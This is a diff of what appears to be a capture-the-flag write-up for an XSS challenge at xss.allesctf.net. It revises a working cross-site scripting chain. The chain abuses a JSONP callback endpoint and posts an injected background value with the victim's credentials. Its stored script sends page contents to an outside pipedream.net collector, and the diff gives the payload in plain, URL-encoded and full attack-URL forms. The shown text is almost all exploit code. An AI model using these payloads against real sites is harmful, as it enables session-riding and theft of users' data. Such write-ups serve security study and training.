@@ -28,21 +28,26 @@ x=stage2.href;fetch(x,{method:"post",credentials:"include",body:new URLSearchPar
 ```
 
 ```js
-x=stage2.href;fetch(x,{method:"post",credentials:"include",body:new URLSearchParams({bg:`lang"\x3e\x3chr id=backgrounds lang="\x3cscript\x3elocation='//enbdblkpmmbod.x.pipedream.net/'+$('b').text()"\x3e\x3c!--`})});location=x;
+fetch(x=stage2,{method:"post",credentials:"include",body:new URLSearchParams({bg:decodeURI(location.hash.slice(1))})});location=x;
+```
+
+Hash:
+```
+lang"><hr id=backgrounds lang="<script>location='//enbz7iuv4yegp.x.pipedream.net/'+$('b').text()"><!--
 ```
 
 ```
-x%3Dstage2.href%3Bfetch%28x%2C%7Bmethod%3A%22post%22%2Ccredentials%3A%22include%22%2Cbody%3Anew%20URLSearchParams%28%7Bbg%3A%60lang%22%5Cx3e%5Cx3chr%20id%3Dbackgrounds%20lang%3D%22%5Cx3cscript%5Cx3elocation%3D%27%2F%2Fenbdblkpmmbod.x.pipedream.net%2F%27%2B%24%28%27b%27%29.text%28%29%22%5Cx3e%5Cx3c%21--%60%7D%29%7D%29%3Blocation%3Dx%3B
+fetch%28x%3Dstage2%2C%7Bmethod%3A%22post%22%2Ccredentials%3A%22include%22%2Cbody%3Anew%20URLSearchParams%28%7Bbg%3AdecodeURI%28location.hash.slice%281%29%29%7D%29%7D%29%3Blocation%3Dx%3B
 ```
 
 defer to wait for jQuery to load
 
 ```
-<script defer src="/items.php?cb=x%3Dstage2.href%3Bfetch%28x%2C%7Bmethod%3A%22post%22%2Ccredentials%3A%22include%22%2Cbody%3Anew%20URLSearchParams%28%7Bbg%3A%60lang%22%5Cx3e%5Cx3chr%20id%3Dbackgrounds%20lang%3D%22%5Cx3cscript%5Cx3elocation%3D%27%2F%2Fenbdblkpmmbod.x.pipedream.net%2F%27%2B%24%28%27b%27%29.text%28%29%22%5Cx3e%5Cx3c%21--%60%7D%29%7D%29%3Blocation%3Dx%3B"></script>
+<script defer src="/items.php?cb=fetch%28x%3Dstage2%2C%7Bmethod%3A%22post%22%2Ccredentials%3A%22include%22%2Cbody%3Anew%20URLSearchParams%28%7Bbg%3AdecodeURI%28location.hash.slice%281%29%29%7D%29%7D%29%3Blocation%3Dx%3B"></script>
 ```
 
 ```
-http://xss.allesctf.net/?search=%3Cscript%20defer%20src%3D%22%2Fitems.php%3Fcb%3Dx%253Dstage2.href%253Bfetch%2528x%252C%257Bmethod%253A%2522post%2522%252Ccredentials%253A%2522include%2522%252Cbody%253Anew%2520URLSearchParams%2528%257Bbg%253A%2560lang%2522%255Cx3e%255Cx3chr%2520id%253Dbackgrounds%2520lang%253D%2522%255Cx3cscript%255Cx3elocation%253D%2527%252F%252Fenbdblkpmmbod.x.pipedream.net%252F%2527%252B%2524%2528%2527b%2527%2529.text%2528%2529%2522%255Cx3e%255Cx3c%2521--%2560%257D%2529%257D%2529%253Blocation%253Dx%253B%22%3E%3C%2Fscript%3E
+http://xss.allesctf.net/?search=%3Cscript%20defer%20src%3D%22%2Fitems.php%3Fcb%3Dfetch%2528x%253Dstage2%252C%257Bmethod%253A%2522post%2522%252Ccredentials%253A%2522include%2522%252Cbody%253Anew%2520URLSearchParams%2528%257Bbg%253AdecodeURI%2528location.hash.slice%25281%2529%2529%257D%2529%257D%2529%253Blocation%253Dx%253B%22%3E%3C%2Fscript%3E#lang"><hr id=backgrounds lang="<script>location='//enbz7iuv4yegp.x.pipedream.net/'+$('b').text()"><!--
 ```
 
 ## What's happening?
